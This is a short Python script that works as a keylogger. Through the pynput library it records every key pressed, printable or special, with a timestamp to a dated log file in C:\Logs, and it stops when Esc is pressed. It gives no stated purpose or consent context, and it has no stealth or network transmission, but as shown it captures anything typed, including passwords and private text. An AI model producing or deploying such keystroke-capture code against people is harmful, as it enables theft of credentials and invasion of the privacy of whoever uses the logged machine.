from pynput import keyboard
import os
from datetime import datetime

# Directory to store log files
log_dir = "C:\\Logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Log file name with the current date
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d')}.log")

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Special key pressed: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
